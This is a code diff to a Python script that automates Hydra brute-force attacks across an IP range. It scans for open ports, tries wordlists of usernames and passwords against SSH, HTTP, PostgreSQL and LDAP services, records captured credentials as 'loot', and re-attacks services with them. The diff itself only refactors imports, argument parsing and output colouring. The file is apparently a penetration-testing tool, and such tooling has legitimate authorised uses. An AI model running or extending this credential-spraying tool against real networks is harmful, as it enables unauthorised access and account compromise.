@@ -1,11 +1,11 @@
 #/usr/bin/env python3
 import os, sys
-import scripts.autonmap as autonmap
-from scripts.util import log_loot, get_logged_loot
-from scripts.http import HTTP
-from scripts.ldap import LDAP
-from scripts.ssh import SSH
-from scripts.postgresql import postgresql
+import autonmap
+from util import log_loot, get_logged_loot, Color
+from http import HTTP
+from ldap import LDAP
+from ssh import SSH
+from postgresql import postgresql
 
 """
 Stuff that has to be defined on a per-exploit basis
@@ -18,15 +18,11 @@ Stuff that has to be defined on a per-exploit basis
 3) What Python function do we run to exploit the compromised system/service
 """
 
-class Arguments:
-    def __init__(self, parser):
-        """Set up parameters from command-line arguments."""
-
 exploits = {
-    'ssh': SSH,
-    'http': HTTP,
-    'postgresql': postgresql,
-    'ldap': LDAP
+    'ssh': SSH(),
+    'http': HTTP(),
+    'postgresql': postgresql(),
+    'ldap': LDAP()
 }
 
 def read_lines(filename):
@@ -37,18 +33,21 @@ def read_lines(filename):
 def main():
     import argparse
     parser = argparse.ArgumentParser(description="Automate Hydra attacks against a specified network range.")
-    parser.add_argument("-h", "--host_ips", metavar="<h>", type=str,
-                        help="IP address range to search")
-    parser.add_argument("-u" "--usernames", metavar="<u>", type=str,
-                        help="File with list of usernames", default=None)
-    parser.add_argument("-p" "--passwords", metavar="<p>", type=str,
-                        help="File with list of passwords", default=None)
-    parser.add_argument("-o" "--output", metavar="<o>", type=str,
-                        help="Optional file to output results to", default=sys.stdout)
+    parser.add_argument("-i", "--host_ips", metavar="<i>", type=str,
+                        help="IP address range to search", dest='host_ips')
+    parser.add_argument("-u", "--usernames", metavar="<u>", type=str,
+                        help="File with list of usernames", default=None, dest='usernames')
+    parser.add_argument("-p", "--passwords", metavar="<p>", type=str,
+                        help="File with list of passwords", default=None, dest='passwords')
+    parser.add_argument("-o", "--output", metavar="<o>", type=str,
+                        help="Optional file to output results to", default=sys.stdout, dest='output')
     parser.add_argument("-d", "--domain", metavar="<d>", type=str,
                         help="The domain of a potential LDAP server to attack",
-                        default="cn=serviceuser,ou=svcaccts,dc=glauth,dc=com")
-    args = Arguments(parser.parse_args())
+                        default="glauth.com", dest='domain')
+    args = parser.parse_args()
+
+    if isinstance(args.output, str):
+        args.output = open(args.output, 'w')
 
     # automatically scan the IP address range and log all open ports that we support attacking
     host_openings = autonmap.autonmap(args.host_ips)
@@ -76,7 +75,7 @@ def main():
     if not get_logged_loot():
         print("Attacks completed. No loot gained.", file=args.output)
         return
-    print("Attack completed. Re-attacking services using gathered loot.")
+    print(f"{Color.GRN}Attack completed. Re-attacking services using gathered loot.{Color.END}", file=args.output)
 
     for host in host_openings:
         found_usernames, found_passwords = zip(*get_logged_loot())
